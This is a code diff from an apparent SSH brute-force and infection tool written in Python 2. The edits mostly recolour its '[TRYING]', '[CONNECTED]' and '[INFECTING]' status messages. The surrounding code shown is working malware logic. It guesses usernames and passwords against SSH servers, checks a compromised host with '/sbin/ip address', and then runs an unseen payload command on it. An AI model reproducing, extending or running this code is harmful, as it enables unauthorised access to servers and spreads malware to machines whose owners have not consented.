@@ -275,7 +275,7 @@ class sshscanner(threading.Thread):
                     else:
                         username = passwd.split(":")[0]
                     try:
-                        print " [Trying] %s %s %s" % (self.host, username, password)
+                        print "\x1b[33m[TRYING] %s %s %s" % (self.host, username, password)
                         ssh.connect(
                             self.host, port=port, username=username, password=password, timeout=3)
                         dobreak = True
@@ -284,13 +284,14 @@ class sshscanner(threading.Thread):
                         pass
                     if True == dobreak:
                         break
+                print "\x1b[32m[CONNECTED] %s %s %s" % (self.host, username, password)
                 badserver = True
                 stdin, stdout, stderr = ssh.exec_command("/sbin/ip address")
                 output = stdout.read()
                 if "inet" in output:
                     badserver = False
                 if badserver == False:
-                    print '\x1b[31mINFECTING:'+self.host+'|'+username+'|'+password+'|'+str(port)
+                    print '\x1b[31m[INFECTING] '+self.host+'|'+username+'|'+password+'|'+str(port)
                     ssh.exec_command(""+cmd+"")
                     time.sleep(20)
                     ssh.close()
